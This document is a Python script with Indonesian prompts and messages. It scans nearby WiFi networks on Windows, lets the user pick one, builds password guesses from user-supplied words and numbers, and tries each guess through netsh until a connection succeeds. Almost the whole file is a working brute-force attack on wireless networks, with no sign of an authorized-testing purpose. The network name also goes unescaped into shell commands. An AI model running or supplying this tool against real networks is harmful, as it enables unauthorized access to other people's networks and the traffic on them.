import subprocess
import time
import os
import sys

def scan_wifi_windows():
    print("[*] Memindai jaringan WiFi...")
    output = subprocess.check_output("netsh wlan show networks", shell=True).decode(errors="ignore")
    lines = output.splitlines()
    ssids = set()
    for line in lines:
        if "SSID" in line and ":" in line:
            ssid = line.split(":", 1)[1].strip()
            if ssid:
                ssids.add(ssid)
    return list(ssids)

def pilih_wifi(ssids):
    print("\n=== Daftar WiFi Terdeteksi ===")
    for i, ssid in enumerate(ssids, 1):
        print(f"{i}. {ssid}")
    print("0. Keluar")

    while True:
        try:
            pilih = int(input("Pilih WiFi (nomor): "))
            if pilih == 0:
                print("[✓] Program dihentikan oleh user.")
                sys.exit()
            return ssids[pilih - 1]
        except:
            print("[!] Pilihan tidak valid.")

def generate_passwords(kata_list, angka_list):
    passwords = []
    for kata in kata_list:
        kata = kata.strip().capitalize()
        for angka in angka_list:
            angka = angka.strip()
            passwords.append(f"{kata}{angka}")
    return passwords

def connect_wifi(ssid, password):
    print(f"[+] Mencoba konek ke {ssid} dengan password: {password}")
    subprocess.call(f'netsh wlan delete profile name="{ssid}"', shell=True, stdout=subprocess.DEVNULL)

    profile = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

    with open("wifi.xml", "w") as f:
        f.write(profile)

    subprocess.call("netsh wlan add profile filename=wifi.xml", shell=True)
    subprocess.call(f'netsh wlan connect name="{ssid}" ssid="{ssid}"', shell=True)
    time.sleep(8)

    try:
        subprocess.check_output("ping -n 2 google.com", shell=True)
        return True
    except:
        return False

def main():
    if os.name != "nt":
        print("[!] Script ini hanya berjalan di Windows.")
        return

    ssids = scan_wifi_windows()
    if not ssids:
        print("[!] Tidak ada WiFi yang terdeteksi.")
        return

    ssid_terpilih = pilih_wifi(ssids)

    kata_input = input("Masukkan kata (pisah koma): ")
    angka_input = input("Masukkan angka (pisah koma): ")
    kata_list = kata_input.split(",")
    angka_list = angka_input.split(",")

    passwords = generate_passwords(kata_list, angka_list)

    print(f"\n[✓] {len(passwords)} kemungkinan password dihasilkan.\n")

    for pw in passwords:
        if connect_wifi(ssid_terpilih, pw):
            print(f"\n[🔥] BERHASIL TERHUBUNG!")
            print(f"[✓] SSID     : {ssid_terpilih}")
            print(f"[✓] PASSWORD : {pw}")
            break
        else:
            print(f"[x] Gagal dengan password: {pw}")
    else:
        print("\n[!] Semua password gagal. Tidak berhasil terhubung.")

    if os.path.exists("wifi.xml"):
        os.remove("wifi.xml")

if __name__ == "__main__":
    main()
